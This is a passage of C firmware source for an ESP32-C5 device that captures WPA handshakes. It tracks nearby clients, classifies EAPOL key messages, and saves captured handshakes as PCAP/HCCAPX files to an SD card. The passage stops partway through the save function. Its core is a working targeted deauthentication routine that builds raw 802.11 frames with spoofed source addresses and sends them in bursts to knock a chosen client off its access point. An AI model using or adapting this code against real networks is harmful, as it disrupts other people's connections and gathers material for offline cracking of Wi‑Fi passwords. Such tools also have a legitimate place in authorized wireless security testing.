Smethan/projectZero/ESP32C5/main/main.c
    if (hs_ap_targets[idx].has_existing_file) {
        // Tab5 parses: strstr("Skipping") && strstr("PCAP already exists")
        MY_LOG_INFO(TAG, "Skipping '%s' - PCAP already exists", 
                   hs_ap_targets[idx].ssid);
    }
    
    return idx;
}

// Find client by MAC, return index or -1
static int hs_find_client(const uint8_t *mac) {
    for (int i = 0; i < hs_client_count; i++) {
        if (memcmp(hs_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

// Add or update client. Returns index.
static int hs_add_or_update_client(const uint8_t *client_mac, int ap_index, int rssi) {
    int64_t now = esp_timer_get_time();
    int idx = hs_find_client(client_mac);
    if (idx >= 0) {
        // Update existing - keep AP association if already set, or update
        if (ap_index >= 0) hs_clients[idx].hs_ap_index = ap_index;
        hs_clients[idx].rssi = rssi;
        hs_clients[idx].last_seen_us = now;
        return idx;
    }
    if (hs_client_count >= HS_MAX_CLIENTS) return -1;
    
    idx = hs_client_count++;
    memcpy(hs_clients[idx].mac, client_mac, 6);
    hs_clients[idx].hs_ap_index = ap_index;
    hs_clients[idx].rssi = rssi;
    hs_clients[idx].last_seen_us = now;
    hs_clients[idx].last_deauth_us = 0;
    hs_clients[idx].deauthed = false;
    
    // This is a new client - bump the dwell reward counter
    hs_dwell_new_clients++;
    
    return idx;
}

// ============================================================================
// Sniffer Handshake: EAPOL Message Detection (inline, multi-AP)
// ============================================================================

// Determine EAPOL message number from parsed key packet. Returns 1-4 or 0.
static uint8_t hs_get_eapol_msg_num(eapol_key_packet_t *eapol_key) {
    if (!eapol_key) return 0;
    
    // Read Key Information (handle endianness like attack_handshake.c)
    uint16_t key_info_raw = *((uint16_t*)&eapol_key->key_information);
    uint8_t byte0 = (key_info_raw >> 8) & 0xFF;
    uint8_t byte1 = key_info_raw & 0xFF;
    
    bool key_ack = (byte0 & 0x80) != 0;
    bool install = (byte0 & 0x40) != 0;
    bool key_mic = (byte1 & 0x01) != 0;
    
    // M1: ACK=1, Install=0, MIC=0
    if (key_ack && !install && !key_mic) return 1;
    // M3: ACK=1, Install=1, MIC=1
    if (key_ack && install && key_mic) return 3;
    // M2 or M4: ACK=0, MIC=1
    if (!key_ack && key_mic && !install) {
        // M2 has SNonce (non-zero), M4 does not
        bool has_nonce = false;
        for (int i = 0; i < 16; i++) {
            if (eapol_key->key_nonce[i] != 0) { has_nonce = true; break; }
        }
        return has_nonce ? 2 : 4;
    }
    return 0;
}

// ============================================================================
// Sniffer Handshake: Targeted Deauth
// ============================================================================

static void hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid, uint8_t channel) {
    // Ensure we're on the correct channel
    uint8_t current_channel;
    wifi_second_chan_t second_chan;
    esp_wifi_get_channel(&current_channel, &second_chan);
    if (current_channel != channel) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    
    // Build targeted deauth frame (destination = station, not broadcast)
    uint8_t deauth_frame[] = {
        0xC0, 0x00,                                     // Type/Subtype: Deauthentication
        0x00, 0x00,                                     // Duration
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Destination: station MAC (filled below)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Source: AP BSSID (filled below)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID (filled below)
        0x00, 0x00,                                     // Sequence
        0x01, 0x00                                      // Reason: Unspecified
    };
    
    // Set destination to specific station MAC
    memcpy(&deauth_frame[4], station_mac, 6);
    // Set source and BSSID to AP
    memcpy(&deauth_frame[10], ap_bssid, 6);
    memcpy(&deauth_frame[16], ap_bssid, 6);
    
    // Send burst of 5 packets
    for (int i = 0; i < 5; i++) {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if (ret != ESP_OK) {
            ESP_LOGW(TAG, "[HS-DEAUTH] Failed to send deauth #%d: %s", i + 1, esp_err_to_name(ret));
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    
    // Also send deauth from client to AP (bidirectional, increases success)
    memcpy(&deauth_frame[4], ap_bssid, 6);    // Destination: AP
    memcpy(&deauth_frame[10], station_mac, 6); // Source: Station
    memcpy(&deauth_frame[16], ap_bssid, 6);   // BSSID: AP
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// ============================================================================
// Sniffer Handshake: Per-AP PCAP Save
// ============================================================================

// Sanitize SSID for filename (same logic as attack_handshake.c)
static void hs_sanitize_ssid(char *out, const char *in, size_t out_size) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j < out_size - 1; i++) {
        char c = in[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || 
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
            out[j++] = c;
        } else {
            out[j++] = '_';
        }
    }
    out[j] = '\0';
    if (j == 0) {
        strncpy(out, "hidden", out_size - 1);
        out[out_size - 1] = '\0';
    }
}

static bool hs_save_handshake_to_sd(int ap_idx) {
    hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
    
    // We need to have the PCAP buffer populated and HCCAPX ready
    hccapx_t *hccapx = (hccapx_t *)hccapx_serializer_get();
    unsigned pcap_size = pcap_serializer_get_size();
    uint8_t *pcap_buf = pcap_serializer_get_buffer();
    
    if (!pcap_buf || pcap_size == 0) {
        MY_LOG_INFO(TAG, "[HS-SAVE] No PCAP data for '%s'", ap->ssid);
        return false;
    }
    
    // Create directory if needed
    struct stat st = {0};
    if (stat("/sdcard/lab/handshakes", &st) == -1) {
        mkdir("/sdcard/lab/handshakes", 0700);
    }
    
    char ssid_safe[33];
    char mac_suffix[7];
    hs_sanitize_ssid(ssid_safe, ap->ssid, sizeof(ssid_safe));
    snprintf(mac_suffix, sizeof(mac_suffix), "%02X%02X%02X", 
             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
    
